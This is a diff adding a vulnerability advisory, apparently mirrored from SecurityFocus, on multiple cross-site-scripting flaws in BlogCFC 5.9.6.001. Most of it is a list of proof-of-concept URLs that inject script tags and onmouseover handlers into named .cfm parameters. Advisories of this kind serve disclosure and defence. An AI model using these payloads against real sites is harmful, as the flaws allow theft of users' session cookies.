@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/45395/info
+
+BlogCFC is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+BlogCFC 5.9.6.001 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/tags/podlayout.cfm?ATTRIBUTES.TITLE=<script>alert(1)</script>&thistag.EXECUTIONMODE=start
+
+http://www.example.com/tags/textarea.cfm?attributes.class=">&lt;/textarea&gt;<script>alert(1)</script>&attributes.fieldname=Procheckup&attributes.style=1&attributes.value=1&
+
+http://www.example.com/includes/pods/subscribe.cfm?errorMessage="><script>alert(1)</script>
+
+http://www.example.com/index.cfm?errorMessage="><script>alert(1)</script>
+
+
+http://www.example.com/includes/pods/subscribe.cfm?"onmouseover="alert(1);
+
+http://www.example.com/index.cfm?"onmouseover="alert(1);
+
+http://www.example.com/search.cfm?"onmouseover="alert(1);
+
+http://www.example.com/stats.cfm?"onmouseover="alert(1);
+
+http://www.example.com/statsbyyear.cfm?"onmouseover="alert(1);
+
+http://www.example.com/tags/getpods.cfm?"onmouseover="alert(1);
